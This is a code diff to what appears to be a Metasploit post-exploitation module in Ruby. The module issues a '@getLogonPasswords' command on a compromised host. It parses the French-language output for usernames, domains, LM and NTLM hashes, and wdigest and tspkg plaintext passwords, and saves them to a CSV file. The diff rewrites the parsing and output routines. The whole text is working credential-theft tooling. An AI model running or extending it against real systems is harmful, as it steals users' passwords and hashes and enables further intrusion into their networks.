@@ -90,9 +90,9 @@ class Metasploit3 < Msf::Post
 		
 		r.channel.read
                 r.channel.write("@getLogonPasswords\n")
-
-		tmpusers = r.channel.read
-		tmpusers += r.channel.read
+		tmpusers = ""
+		tmpusers += r.channel.read.to_s
+		tmpusers += r.channel.read.to_s
 
 		users = parse_passdump(tmpusers)
 		output_file(users, password_file)
@@ -110,58 +110,36 @@ class Metasploit3 < Msf::Post
 
 		users = []
 
-		pass_dump.lines.each do |f|
+		current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
 
-			current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
+		pass_dump.split(/\r?\n/).each do |line|
 
-			f.each_line do |line|
-				if line.match(/^Utilisateur principal/)
-					current[:username] = line[30..-2]
-				elsif line.match(/^Domaine d'authentification/)
-					current[:domain] = line[30..-2]
-				elsif line.match(/msv1_0/)
-					tmp = line[24..-2]
-					if tmp == "n.t. (LUID KO)"
-						current[:lmhash] = ""
-						current[:ntlmhash] = ""
-					else
-						current[:lmhash] = line[28, 32]
-						current[:ntlmhash] = line[70, 32]
-					end
-				elsif line.match(/wdigest/)
-					tmp = line[24..-2]
-					if tmp == "n.t. (LUID KO)"
-						current[:wdigest] = ""
-					else
-						if tmp.nil?
-							current[:wdigest] = ""
-						else
-							current[:wdigest] = tmp
-						end
-					end
-				elsif line.match(/tspkg/)
-					tmp = line[24..-2]
-					if tmp == "n.t. (LUID KO)"
-						current[:tspkg] = ""
-					else
-						current[:tspkg] = tmp
-					end
+			if line.match(/^Utilisateur principal/)
+				current[:username] = line[/.*:\s(.*)/, 1] || ""
+			elsif line.match(/^Domaine d'authentification/)
+				current[:domain] = line[/.*:\s(.*)/, 1] || ""
+			elsif line.match(/msv1_0/)
+				current[:lmhash] = line[/.*:\s*lm\{\s([0-9a-f]*)\s\}.*/, 1] || ""
+				current[:ntlmhash] = line[/.*ntlm\{\s([0-9a-f]*)\s\}.*/, 1] || ""
+			elsif line.match(/wdigest/)
+				current[:wdigest] = line[/.*:\s*(.*)/, 1] || ""
+				current[:wdigest] = "" if current[:wdigest] == "n.t. (LUID KO)"	
+			elsif line.match(/tspkg/)
+				current[:tspkg] = line[/.*:\s*(.*)/, 1] || ""
+				current[:tspkg] = "" if current[:tspkg] == "n.t. (LUID KO)"
 
-					users.push(current)
-					current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
-				end
+				users.push(current)
+				current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
 			end
-		end	
-		
+		end
+
 		return users
 	end
 
 	def output_file(users, password_file)
 
 		output = "username, domain, lmhash, ntlmhash, wdigest, tspkg\n"
-		users.each do |u|
-			output += "#{u[:username]}, #{u[:domain]}, #{u[:lmhash]}, #{u[:ntlmhash]}, #{u[:wdigest]}, #{u[:tspkg]}\n" 
-		end
+		output += users.collect {|u| "\"#{u[:username]}\", \"#{u[:domain]}\", \"#{u[:lmhash]}\", \"#{u[:ntlmhash]}\", \"#{u[:wdigest]}\", \"#{u[:tspkg]}\"\n" }.join
 
 		file_local_write(password_file, output)	
 
